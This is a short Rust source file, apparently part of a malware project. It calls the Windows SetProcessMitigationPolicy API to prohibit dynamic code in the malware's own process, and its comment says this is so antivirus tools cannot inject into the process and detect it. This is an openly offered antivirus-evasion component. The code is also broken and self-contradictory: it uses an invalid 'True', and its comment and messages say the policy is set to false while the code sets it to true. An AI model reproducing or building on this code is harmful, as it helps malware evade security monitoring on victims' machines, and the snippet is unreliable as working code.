//this file is to set the mitigation policy of the malware process to false so tha the AVs cannot detect any malicious code by dynamically injecting arbitrary code into it.
extern crate winapi;

use winapi::shared::minwindef::{BOOL,DWORD,FALSE};
use winapi::um::processthreadsapi::{GetCurrentProcess,SetProcessMitigationPolicy,PROCESS_DYNAMIC_CODE_POLICY};

#[repr(C)]
struct ProcessDynamicCodePolicy{
    ProhibitDynamicCode: BOOL,
}

pub fn set_policy(){
    unsafe{
        let policy = ProcessDynamicCodePolicy{
            ProhibitDynamicCode: True,
        };

        let result = SetProcessMitigationPolicy(
            PROCESS_DYNAMIC_CODE_POLICY,
            &policy as *const _ as * const _,
            std::mem::size_of::<ProcessDynamicCodePolicy>() as DWORD,
        );

        if result == 0{
            eprintln!("Failed to set the policy");
        }
        else{
            println!("Successfully set the policy to False");
        }
    }
}